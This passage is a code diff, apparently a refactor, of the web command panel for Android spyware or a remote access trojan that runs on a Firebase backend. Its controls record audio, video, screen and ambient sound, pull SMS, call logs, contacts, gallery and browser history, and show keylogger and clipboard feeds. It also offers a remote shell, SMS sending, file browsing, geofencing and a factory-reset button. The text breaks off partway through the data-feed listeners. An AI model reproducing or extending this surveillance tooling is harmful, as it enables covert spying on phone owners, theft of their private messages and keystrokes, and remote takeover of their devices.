@@ -56,34 +56,28 @@ onAuthStateChanged(auth, (user) => {
 });
 
 // ==========================================
-// LOAD DEVICES FROM /devices STRUCTURE
+// LOAD DEVICES
 // ==========================================
 function loadAllDevices() {
     const devicesRef = ref(database, 'devices');
     onValue(devicesRef, (snapshot) => {
         allDevices = [];
-
         if (snapshot.exists()) {
             const data = snapshot.val();
-
             Object.keys(data).forEach(deviceUid => {
-                const deviceData = data[deviceUid];
-
-                const model = deviceData.identity?.model || "Unknown Model";
-                const customName = deviceData.identity?.custom_name || deviceData.deviceName || "Unknown Device";
-
+                const d = data[deviceUid];
+                const model = d.identity?.model || "Unknown Model";
+                const customName = d.identity?.custom_name || d.deviceName || "Unknown Device";
                 allDevices.push({
                     uid: deviceUid,
                     name: `${customName} (${model})`,
-                    battery: deviceData.battery_level || deviceData.status?.batteryPercentage || 0,
-                    lastSeen: deviceData.last_seen || 0,
-                    online: (Date.now() - (deviceData.last_seen || 0)) < 300000,
-                    networkType: deviceData.status?.networkType || "UNKNOWN",
-                    lat: deviceData.location?.lat || deviceData.status?.latitude || 0,
-                    lng: deviceData.location?.lng || deviceData.status?.longitude || 0
+                    battery: d.battery_level || d.status?.batteryPercentage || 0,
+                    lastSeen: d.last_seen || 0,
+                    online: (Date.now() - (d.last_seen || 0)) < 300000,
+                    lat: d.location?.lat || d.status?.latitude || 0,
+                    lng: d.location?.lng || d.status?.longitude || 0
                 });
             });
-
             renderDevicesList();
             if (allDevices.length > 0 && !selectedDevice) selectDevice(allDevices[0].uid);
         } else {
@@ -98,27 +92,21 @@ function loadAllDevices() {
 function renderDevicesList() {
     devicesList.innerHTML = '';
     deviceCount.textContent = allDevices.length;
-
     allDevices.forEach(device => {
-        const deviceItem = document.createElement('div');
-        deviceItem.className = `device-item ${selectedDevice === device.uid ? 'active' : ''}`;
-        deviceItem.innerHTML = `
+        const item = document.createElement('div');
+        item.className = `device-item ${selectedDevice === device.uid ? 'active' : ''}`;
+        item.innerHTML = `
             <div class="device-item-info">
                 <div class="device-item-name">${device.name}</div>
                 <div class="device-item-status ${device.online ? 'device-online' : 'device-offline'}">
                     ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'} • 🔋${device.battery}%
                 </div>
             </div>`;
-
-        deviceItem.addEventListener('click', () => selectDevice(device.uid));
-        devicesList.appendChild(deviceItem);
+        item.addEventListener('click', () => selectDevice(device.uid));
+        devicesList.appendChild(item);
     });
-
     if (allDevices.length === 0) showNoDeviceAlert();
-    else {
-        noDeviceAlert.style.display = 'none';
-        deviceDashboard.style.display = 'block';
-    }
+    else { noDeviceAlert.style.display = 'none'; deviceDashboard.style.display = 'block'; }
 }
 
 // ==========================================
@@ -126,44 +114,34 @@ function renderDevicesList() {
 // ==========================================
 function selectDevice(deviceUid) {
     selectedDevice = deviceUid;
-
     renderDevicesList();
     noDeviceAlert.style.display = 'none';
     deviceDashboard.style.display = 'block';
-
     injectAdvancedControls();
-
-    // Clean up old listeners
-    Object.keys(deviceListeners).forEach(key => {
-        try { off(deviceListeners[key]); } catch(e) {}
-    });
+    Object.keys(deviceListeners).forEach(key => { try { off(deviceListeners[key]); } catch(e) {} });
     deviceListeners = {};
-
     loadDeviceData(deviceUid);
     setupCommandListeners(deviceUid);
 }
 
 // ==========================================
-// INJECT ALL 20+ ADVANCED CONTROLS (FIXED ORDER)
+// INJECT ADVANCED CONTROLS
 // ==========================================
 function injectAdvancedControls() {
     if (document.getElementById('cmd-audio')) return;
-
     const matrix = document.querySelector('.card-grid');
     if (!matrix) return;
-
     const parentGrid = matrix.closest('.dashboard-grid-container');
     const controlMatrixCard = matrix.closest('.crypto-card');
 
-    // ── Media toggle buttons (inside matrix grid) ────
+    // Media toggles
     matrix.appendChild(createMatrixBtn('cmd-audio', 'fa-microphone-lines', 'AUDIO REC', 'OFF'));
     matrix.appendChild(createMatrixBtn('cmd-video', 'fa-video', 'VIDEO REC', 'OFF'));
     matrix.appendChild(createMatrixBtn('cmd-ambient', 'fa-wave-square', 'AMBIENT MIC', 'OFF'));
     matrix.appendChild(createMatrixBtn('cmd-screenrec', 'fa-desktop', 'SCREEN REC', 'OFF'));
 
-    // ── SECTION: Data Extraction (inside matrix) ────
+    // Data Extraction
     matrix.appendChild(createSectionHeader('📊 DATA EXTRACTION'));
-
     matrix.appendChild(createMatrixBtn('cmd-readsms', 'fa-message', 'READ SMS', 'TRIGGER'));
     matrix.appendChild(createMatrixBtn('cmd-readcalls', 'fa-phone', 'CALL LOG', 'TRIGGER'));
     matrix.appendChild(createMatrixBtn('cmd-readcontacts', 'fa-address-book', 'CONTACTS', 'TRIGGER'));
@@ -176,871 +154,382 @@ function injectAdvancedControls() {
     matrix.appendChild(createMatrixBtn('cmd-gallery', 'fa-images', 'GALLERY', 'TRIGGER'));
     matrix.appendChild(createMatrixBtn('cmd-browser', 'fa-globe', 'BROWSER HIST', 'TRIGGER'));
 
-    // ── SECTION: Remote Control (inside matrix) ─────
+    // Remote Control
     matrix.appendChild(createSectionHeader('🎮 REMOTE CONTROL'));
-
     matrix.appendChild(createMatrixBtn('cmd-screenshot', 'fa-camera-retro', 'SCREENSHOT', 'TRIGGER'));
     matrix.appendChild(createMatrixBtn('cmd-storage', 'fa-hard-drive', 'STORAGE', 'TRIGGER'));
 
-    // ── SECTION: Danger Zone (inside matrix) ────────
+    // Danger Zone
     matrix.appendChild(createSectionHeader('⚠️ DANGER ZONE'));
+    const uninst = createMatrixBtn('cmd-uninstall', 'fa-trash', 'UNINSTALL APP', 'TRIGGER'); uninst.style.borderColor = '#ff6b6b'; matrix.appendChild(uninst);
+    const rebot = createMatrixBtn('cmd-reboot', 'fa-power-off', 'REBOOT', 'TRIGGER'); rebot.style.borderColor = '#ff6b6b'; matrix.appendChild(rebot);
+    const shutd = createMatrixBtn('cmd-shutdown', 'fa-plug-circle-xmark', 'SHUTDOWN', 'TRIGGER'); shutd.style.borderColor = '#ff6b6b'; matrix.appendChild(shutd);
+    const factr = createMatrixBtn('cmd-factory', 'fa-bomb', 'FACTORY RESET', 'TRIGGER'); factr.style.borderColor = '#ff0000'; matrix.appendChild(factr);
+    const lockn = createMatrixBtn('cmd-locknow', 'fa-lock', 'LOCK NOW', 'TRIGGER'); lockn.style.borderColor = '#ff6b6b'; matrix.appendChild(lockn);
 
-    const uninstallBtn = createMatrixBtn('cmd-uninstall', 'fa-trash', 'UNINSTALL APP', 'TRIGGER');
-    uninstallBtn.style.borderColor = '#ff6b6b';
-    matrix.appendChild(uninstallBtn);
+    // Input wrappers
+    const timeW = document.createElement('div'); timeW.className = 'time-control-wrapper';
+    timeW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE</label><input type="time" id="time-setter">`;
+    controlMatrixCard.after(timeW);
 
-    const rebootBtn = createMatrixBtn('cmd-reboot', 'fa-power-off', 'REBOOT', 'TRIGGER');
-    rebootBtn.style.borderColor = '#ff6b6b';
-    matrix.appendChild(rebootBtn);
+    const shellW = document.createElement('div'); shellW.className = 'shell-control-wrapper';
+    shellW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-terminal"></i> REMOTE SHELL</label><div style="display:flex;gap:8px;"><input type="text" id="shell-input" placeholder="ls /sdcard" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-shell" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">RUN</button></div><pre id="shell-output" style="display:none;"></pre>`;
+    timeW.after(shellW);
 
-    const shutdownBtn = createMatrixBtn('cmd-shutdown', 'fa-plug-circle-xmark', 'SHUTDOWN', 'TRIGGER');
-    shutdownBtn.style.borderColor = '#ff6b6b';
-    matrix.appendChild(shutdownBtn);
+    const smsW = document.createElement('div'); smsW.className = 'shell-control-wrapper';
+    smsW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-paper-plane"></i> SEND SMS</label><div style="display:flex;gap:8px;margin-bottom:8px;"><input type="text" id="sms-number" placeholder="+256700123456" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"></div><div style="display:flex;gap:8px;"><input type="text" id="sms-body" placeholder="Message text..." style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"><button id="cmd-sendsms" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">SEND</button></div>`;
+    shellW.after(smsW);
 
-    const factoryBtn = createMatrixBtn('cmd-factory', 'fa-bomb', 'FACTORY RESET', 'TRIGGER');
-    factoryBtn.style.borderColor = '#ff0000';
-    matrix.appendChild(factoryBtn);
+    const fileW = document.createElement('div'); fileW.className = 'shell-control-wrapper';
+    fileW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-folder-open"></i> FILE BROWSER</label><div style="display:flex;gap:8px;"><input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-listfiles" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">LIST</button></div><pre id="file-output" style="display:none;"></pre>`;
+    smsW.after(fileW);
 
-    const lockNowBtn = createMatrixBtn('cmd-locknow', 'fa-lock', 'LOCK NOW', 'TRIGGER');
-    lockNowBtn.style.borderColor = '#ff6b6b';
-    matrix.appendChild(lockNowBtn);
+    const geoW = document.createElement('div'); geoW.className = 'shell-control-wrapper';
+    geoW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-location-crosshairs"></i> GEOFENCE</label><div style="display:flex;gap:8px;margin-bottom:8px;"><input type="number" id="geo-lat" placeholder="Latitude (0.3476)" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"><input type="number" id="geo-lng" placeholder="Longitude (32.5825)" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"><input type="number" id="geo-radius" placeholder="Radius (m)" value="1000" style="width:100px;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"></div><div style="display:flex;gap:8px;"><button id="cmd-setgeo" style="flex:1;padding:10px;background:#ffd93d;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">SET GEOFENCE</button><button id="cmd-disablegeo" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">DISABLE</button></div>`;
+    fileW.after(geoW);
 
-    // ── INPUT WRAPPERS (chained after the control matrix card) ──
-
-    // 1. Time Activation
-    const timeWrapper = document.createElement('div');
-    timeWrapper.className = 'time-control-wrapper';
-    timeWrapper.innerHTML = `
-        <label class="time-control-label">
-            <i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE
-        </label>
-        <input type="time" id="time-setter">
-    `;
-    controlMatrixCard.after(timeWrapper);
-
-    // 2. Shell Command
-    const shellWrapper = document.createElement('div');
-    shellWrapper.className = 'shell-control-wrapper';
-    shellWrapper.innerHTML = `
-        <label class="time-control-label">
-            <i class="fa-solid fa-terminal"></i> REMOTE SHELL
-        </label>
-        <div style="display:flex;gap:8px;">
-            <input type="text" id="shell-input" placeholder="ls /sdcard" 
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
-            <button id="cmd-shell" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">RUN</button>
-        </div>
-        <pre id="shell-output" style="display:none;"></pre>
-    `;
-    timeWrapper.after(shellWrapper);
-
-    // 3. Send SMS
-    const smsWrapper = document.createElement('div');
-    smsWrapper.className = 'shell-control-wrapper';
-    smsWrapper.innerHTML = `
-        <label class="time-control-label">
-            <i class="fa-solid fa-paper-plane"></i> SEND SMS
-        </label>
-        <div style="display:flex;gap:8px;margin-bottom:8px;">
-            <input type="text" id="sms-number" placeholder="+256700123456" 
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
-        </div>
-        <div style="display:flex;gap:8px;">
-            <input type="text" id="sms-body" placeholder="Message text..." 
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
-            <button id="cmd-sendsms" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">SEND</button>
-        </div>
-    `;
-    shellWrapper.after(smsWrapper);
-
-    // 4. File Browser
-    const fileWrapper = document.createElement('div');
-    fileWrapper.className = 'shell-control-wrapper';
-    fileWrapper.innerHTML = `
-        <label class="time-control-label">
-            <i class="fa-solid fa-folder-open"></i> FILE BROWSER
-        </label>
-        <div style="display:flex;gap:8px;">
-            <input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0"
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
-            <button id="cmd-listfiles" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">LIST</button>
-        </div>
-        <pre id="file-output" style="display:none;"></pre>
-    `;
-    smsWrapper.after(fileWrapper);
-
-    // 5. Geofence
-    const geoWrapper = document.createElement('div');
-    geoWrapper.className = 'shell-control-wrapper';
-    geoWrapper.innerHTML = `
-        <label class="time-control-label">
-            <i class="fa-solid fa-location-crosshairs"></i> GEOFENCE
-        </label>
-        <div style="display:flex;gap:8px;margin-bottom:8px;">
-            <input type="number" id="geo-lat" placeholder="Latitude (0.3476)" step="0.000001"
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
-            <input type="number" id="geo-lng" placeholder="Longitude (32.5825)" step="0.000001"
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
-            <input type="number" id="geo-radius" placeholder="Radius (m)" value="1000"
-                   style="width:100px;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
-        </div>
-        <div style="display:flex;gap:8px;">
-            <button id="cmd-setgeo" style="flex:1;padding:10px;background:#ffd93d;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">SET GEOFENCE</button>
-            <button id="cmd-disablegeo" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">DISABLE</button>
-        </div>
-    `;
-    fileWrapper.after(geoWrapper);
-
-    // ── DATA PANELS (at the very end of the grid) ────
-    const dataPanels = document.createElement('div');
-    dataPanels.className = 'data-panels-grid';
-    dataPanels.innerHTML = `
-        <div class="data-panel" id="panel-sms">
-            <div class="data-panel-header">📱 SMS Messages <span id="sms-count" class="badge">0</span></div>
-            <div class="data-panel-body" id="sms-feed">Waiting for data...</div>
-        </div>
-        <div class="data-panel" id="panel-calls">
-            <div class="data-panel-header">📞 Call Log <span id="calls-count" class="badge">0</span></div>
-            <div class="data-panel-body" id="calls-feed">Waiting for data...</div>
-        </div>
-        <div class="data-panel" id="panel-contacts">
-            <div class="data-panel-header">👥 Contacts <span id="contacts-count" class="badge">0</span></div>
-            <div class="data-panel-body" id="contacts-feed">Waiting for data...</div>
-        </div>
-        <div class="data-panel" id="panel-wifi">
-            <div class="data-panel-header">📡 Wi-Fi Networks <span id="wifi-count" class="badge">0</span></div>
-            <div class="data-panel-body" id="wifi-feed">Waiting for data...</div>
-        </div>
-        <div class="data-panel" id="panel-apps">
-            <div class="data-panel-header">📦 Installed Apps <span id="apps-count" class="badge">0</span></div>
-            <div class="data-panel-body" id="apps-feed">Waiting for data...</div>
-        </div>
-        <div class="data-panel" id="panel-deviceinfo">
-            <div class="data-panel-header">📋 Device Info</div>
-            <div class="data-panel-body" id="deviceinfo-feed">Waiting for data...</div>
-        </div>
-        <div class="data-panel" id="panel-battery">
-            <div class="data-panel-header">🔋 Battery Details</div>
-            <div class="data-panel-body" id="battery-feed">Waiting for data...</div>
-        </div>
-        <div class="data-panel" id="panel-keylog">
-            <div class="data-panel-header">⌨️ Keylogger <span id="keylog-count" class="badge">0</span></div>
-            <div class="data-panel-body" id="keylog-feed">Waiting for data...</div>
-        </div>
-        <div class="data-panel" id="panel-geofence">
-            <div class="data-panel-header">📍 Geofence Alerts</div>
-            <div class="data-panel-body" id="geofence-feed">No alerts</div>
-        </div>
-        <div class="data-panel" id="panel-clipboard">
-            <div class="data-panel-header">📋 Clipboard</div>
-            <div class="data-panel-body" id="clipboard-feed">Waiting for data...</div>
-        </div>
-        <div class="data-panel" id="panel-browser">
-            <div class="data-panel-header">🌐 Browser History</div>
-            <div class="data-panel-body" id="browser-feed">Waiting for data...</div>
-        </div>
-        <div class="data-panel" id="panel-gallery">
-            <div class="data-panel-header">🖼️ Gallery</div>
-            <div class="data-panel-body" id="gallery-feed">Waiting for data...</div>
-        </div>
-    `;
-    parentGrid.appendChild(dataPanels);
+    // Data panels
+    const dp = document.createElement('div'); dp.className = 'data-panels-grid';
+    dp.innerHTML = `
+        <div class="data-panel"><div class="data-panel-header">📱 SMS Messages <span id="sms-count" class="badge">0</span></div><div class="data-panel-body" id="sms-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">📞 Call Log <span id="calls-count" class="badge">0</span></div><div class="data-panel-body" id="calls-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">👥 Contacts <span id="contacts-count" class="badge">0</span></div><div class="data-panel-body" id="contacts-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">📡 Wi-Fi Networks <span id="wifi-count" class="badge">0</span></div><div class="data-panel-body" id="wifi-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">📦 Installed Apps <span id="apps-count" class="badge">0</span></div><div class="data-panel-body" id="apps-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">📋 Device Info</div><div class="data-panel-body" id="deviceinfo-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">🔋 Battery Details</div><div class="data-panel-body" id="battery-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">⌨️ Keylogger <span id="keylog-count" class="badge">0</span></div><div class="data-panel-body" id="keylog-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">📍 Geofence Alerts</div><div class="data-panel-body" id="geofence-feed">No alerts</div></div>
+        <div class="data-panel"><div class="data-panel-header">📋 Clipboard</div><div class="data-panel-body" id="clipboard-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">🌐 Browser History</div><div class="data-panel-body" id="browser-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">🖼️ Gallery</div><div class="data-panel-body" id="gallery-feed">Waiting for data...</div></div>`;
+    parentGrid.appendChild(dp);
 }
 
-// Helper: Create a matrix button
 function createMatrixBtn(id, icon, label, stateText) {
     const btn = document.createElement('button');
-    btn.id = id;
-    btn.className = 'matrix-btn toggle-btn';
+    btn.id = id; btn.className = 'matrix-btn toggle-btn';
     btn.innerHTML = `<i class="fa-solid ${icon}"></i><span>${label}</span><span class="toggle-state">${stateText}</span>`;
     return btn;
 }
 
-// Helper: Create section header
 function createSectionHeader(title) {
-    const header = document.createElement('div');
-    header.className = 'section-header';
-    header.innerHTML = `<h3>${title}</h3>`;
-    return header;
+    const h = document.createElement('div'); h.className = 'section-header';
+    h.innerHTML = `<h3>${title}</h3>`; return h;
 }
 
 // ==========================================
 // LOAD DEVICE DATA
 // ==========================================
-function loadDeviceData(deviceUid) {
-    const device = allDevices.find(d => d.uid === deviceUid);
+function loadDeviceData(uid) {
+    const device = allDevices.find(d => d.uid === uid);
     if (!device) return;
-
     document.getElementById('selected-device-name').textContent = device.name;
-    initializeTelemetryStream(deviceUid);
-    initializeCommandStateListeners(deviceUid);
-    initializeDataFeedListeners(deviceUid);
+    initializeTelemetryStream(uid);
+    initializeCommandStateListeners(uid);
+    initializeDataFeedListeners(uid);
 }
 
 // ==========================================
-// REAL-TIME TELEMETRY STREAM
+// TELEMETRY STREAM
 // ==========================================
 function initializeTelemetryStream(uid) {
     const statusRef = ref(database, `devices/${uid}/status`);
-
     if (deviceListeners[`status-${uid}`]) off(deviceListeners[`status-${uid}`]);
-
-    const listener = onValue(statusRef, (snapshot) => {
-        if (!snapshot.exists()) return;
-        const data = snapshot.val();
-
-        // Battery
+    deviceListeners[`status-${uid}`] = onValue(statusRef, (snap) => {
+        if (!snap.exists()) return;
+        const d = snap.val();
         if (document.getElementById('battery-text')) {
-            document.getElementById('battery-text').textContent =
-                data.batteryPercentage !== undefined ? `${data.batteryPercentage}%` : "--%";
+            document.getElementById('battery-text').textContent = d.batteryPercentage !== undefined ? `${d.batteryPercentage}%` : "--%";
             const bar = document.getElementById('battery-bar');
-            if (bar) bar.style.width = `${data.batteryPercentage || 0}%`;
+            if (bar) bar.style.width = `${d.batteryPercentage || 0}%`;
         }
-
-        // GPS
-        if (document.getElementById('latitude-text') && data.latitude != null) {
-            document.getElementById('latitude-text').textContent = parseFloat(data.latitude).toFixed(6);
-            document.getElementById('longitude-text').textContent = parseFloat(data.longitude).toFixed(6);
-            const mapLink = document.getElementById('map-link');
-            if (mapLink) mapLink.href = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
+        if (document.getElementById('latitude-text') && d.latitude != null) {
+            document.getElementById('latitude-text').textContent = parseFloat(d.latitude).toFixed(6);
+            document.getElementById('longitude-text').textContent = parseFloat(d.longitude).toFixed(6);
+            const ml = document.getElementById('map-link');
+            if (ml) ml.href = `https://www.google.com/maps/search/?api=1&query=${d.latitude},${d.longitude}`;
         }
-
-        // Last seen
-        const lastSeenEl = document.getElementById('last-seen-text');
-        if (lastSeenEl && data.last_seen) {
-            lastSeenEl.textContent = new Date(data.last_seen).toLocaleString();
-        }
-
-        // Media upload state
-        const uploadState = data.media_upload_state || "idle";
-        ['cmd-audio', 'cmd-video'].forEach(btnId => {
-            const btn = document.getElementById(btnId);
-            if (!btn) return;
-            const stateEl = btn.querySelector('.toggle-state');
-            if (uploadState === "recording") {
-                btn.classList.add('active');
-                if (stateEl) { stateEl.textContent = 'REC'; stateEl.style.color = '#ffaa00'; }
-            } else if (uploadState === "uploading") {
-                btn.classList.add('active');
-                if (stateEl) { stateEl.textContent = 'UPD...'; stateEl.style.color = '#00e5ff'; }
-            }
-        });
+        const ls = document.getElementById('last-seen-text');
+        if (ls && d.last_seen) ls.textContent = new Date(d.last_seen).toLocaleString();
 
         // Media display
         const img = document.getElementById('cameraPreviewFrame');
-        const video = document.getElementById('mediaVideoPlayer');
-        const audioEl = document.getElementById('mediaAudioPlayer');
-        const audioContainer = document.getElementById('audio-container');
-        const placeholder = document.getElementById('mediaPlaceholderText');
-        const timestamp = document.getElementById('captureTimestamp');
-
-        const hideAll = () => {
-            if (img) img.style.display = 'none';
-            if (video) { video.style.display = 'none'; video.pause(); }
-            if (audioEl) { audioEl.style.display = 'none'; audioEl.pause(); }
-            if (audioContainer) audioContainer.style.display = 'none';
-            if (placeholder) placeholder.style.display = 'block';
-        };
-
-        const photoUrl = data.lastPhotoUrl || data.last_photo_url;
-        const videoUrl = data.lastVideoUrl || data.last_video_url;
-        const audioUrl = data.lastAudioUrl || data.last_audio_url;
-
-        let activeMedia = false;
-
-        if (photoUrl && img) {
-            hideAll();
-            const cacheBuster = photoUrl.startsWith('data:') ? '' : `?t=${Date.now()}`;
-            img.src = photoUrl + cacheBuster;
-            img.style.display = 'block';
-            activeMedia = true;
-        } else if (videoUrl && video) {
-            hideAll();
-            if (video.src !== videoUrl) { video.src = videoUrl; video.load(); }
-            video.style.display = 'block';
-            activeMedia = true;
-        } else if (audioUrl && audioEl) {
-            hideAll();
-            if (audioEl.src !== audioUrl) { audioEl.src = audioUrl; audioEl.load(); }
-            audioEl.style.display = 'block';
-            if (audioContainer) audioContainer.style.display = 'block';
-            activeMedia = true;
-        }
-
-        if (activeMedia && timestamp) {
-            timestamp.innerText = `LAST UPDATED: ${new Date().toLocaleTimeString()}`;
-        } else if (!activeMedia && placeholder) {
-            placeholder.style.display = 'block';
-        }
+        const vid = document.getElementById('mediaVideoPlayer');
+        const aud = document.getElementById('mediaAudioPlayer');
+        const audC = document.getElementById('audio-container');
+        const ph = document.getElementById('mediaPlaceholderText');
+        const ts = document.getElementById('captureTimestamp');
+        const hideAll = () => { if(img) img.style.display='none'; if(vid){vid.style.display='none';vid.pause();} if(aud){aud.style.display='none';aud.pause();} if(audC) audC.style.display='none'; if(ph) ph.style.display='block'; };
+        const photoUrl = d.lastPhotoUrl || d.last_photo_url;
+        const videoUrl = d.lastVideoUrl || d.last_video_url;
+        const audioUrl = d.lastAudioUrl || d.last_audio_url;
+        let active = false;
+        if (photoUrl && img) { hideAll(); img.src = photoUrl + (photoUrl.startsWith('data:') ? '' : `?t=${Date.now()}`); img.style.display='block'; active=true; }
+        else if (videoUrl && vid) { hideAll(); if(vid.src!==videoUrl){vid.src=videoUrl;vid.load();} vid.style.display='block'; active=true; }
+        else if (audioUrl && aud) { hideAll(); if(aud.src!==audioUrl){aud.src=audioUrl;aud.load();} aud.style.display='block'; if(audC) audC.style.display='block'; active=true; }
+        if (active && ts) ts.innerText = `LAST UPDATED: ${new Date().toLocaleTimeString()}`;
+        else if (!active && ph) ph.style.display = 'block';
     });
-
-    deviceListeners[`status-${uid}`] = listener;
 }
 
 // ==========================================
-// COMMAND STATE LISTENERS
+// COMMAND STATE LISTENERS — FIX: Only update TOGGLES
 // ==========================================
 function initializeCommandStateListeners(uid) {
     const commandsRef = ref(database, `devices/${uid}/commands`);
-    const listener = onValue(commandsRef, (snapshot) => {
-        const cmd = snapshot.val() || {};
-
+    deviceListeners[`commands-${uid}`] = onValue(commandsRef, (snap) => {
+        const cmd = snap.val() || {};
+        // ONLY toggle buttons — these stay on/off
         updateButtonState('cmd-flashlight', cmd.flashlight);
         updateButtonState('cmd-alarm', cmd.alarm);
         updateButtonState('cmd-lock', cmd.emergencyLock);
-        updateButtonState('cmd-capture', cmd.cameraCapture);
         updateButtonState('cmd-audio', cmd.record_audio);
         updateButtonState('cmd-video', cmd.record_video);
         updateButtonState('cmd-ambient', cmd.start_ambient);
         updateButtonState('cmd-screenrec', cmd.record_screen);
         updateButtonState('cmd-clipboard', cmd.monitor_clipboard);
-
-        const timeInput = document.getElementById('time-setter');
-        if (timeInput && cmd.activation_time) {
-            if (document.activeElement !== timeInput) {
-                timeInput.value = cmd.activation_time;
-            }
-        }
+        // DO NOT update trigger buttons — they fire once and reset on the phone side
+        const ti = document.getElementById('time-setter');
+        if (ti && cmd.activation_time && document.activeElement !== ti) ti.value = cmd.activation_time;
     });
-    deviceListeners[`commands-${uid}`] = listener;
 }
 
 // ==========================================
-// DATA FEED LISTENERS (ALL 20 FEATURES)
+// DATA FEED LISTENERS
 // ==========================================
 function initializeDataFeedListeners(uid) {
-    // SMS Feed
-    listenToFeed(uid, 'sms', (data) => {
-        const messages = data.messages || [];
-        const countEl = document.getElementById('sms-count');
-        if (countEl) countEl.textContent = messages.length;
-        const feed = document.getElementById('sms-feed');
-        if (!feed) return;
-        if (messages.length === 0) { feed.innerHTML = 'No SMS data yet'; return; }
-        feed.innerHTML = messages.map(m =>
-            `<div class="feed-item"><strong>${escapeHtml(m.sender || 'Unknown')}</strong> <small>${formatTime(m.timestamp)}</small><br>${escapeHtml(m.body || '')}</div>`
-        ).join('');
+    listenToFeed(uid, 'sms', (d) => {
+        const msgs = d.messages || []; const c = document.getElementById('sms-count'); if(c) c.textContent = msgs.length;
+        const f = document.getElementById('sms-feed'); if(!f) return;
+        if(!msgs.length){f.innerHTML='No SMS data yet';return;}
+        f.innerHTML = msgs.map(m=>`<div class="feed-item"><strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}</div>`).join('');
     });
-
-    // Live SMS
-    listenToFeed(uid, 'sms_live', (data) => {
-        const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 20);
-        const feed = document.getElementById('sms-feed');
-        if (!feed || items.length === 0) return;
-        const liveHtml = items.map(m =>
-            `<div class="feed-item live-item">🔴 <strong>${escapeHtml(m.sender || 'Unknown')}</strong> <small>${formatTime(m.timestamp)}</small><br>${escapeHtml(m.body || '')}</div>`
-        ).join('');
-        feed.innerHTML = liveHtml + feed.innerHTML;
+    listenToFeed(uid, 'sms_live', (d) => {
+        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
+        const f = document.getElementById('sms-feed'); if(!f||!items.length) return;
+        f.innerHTML = items.map(m=>`<div class="feed-item live-item">🔴 <strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}</div>`).join('') + f.innerHTML;
     });
-
-    // Call Log
-    listenToFeed(uid, 'call_log', (data) => {
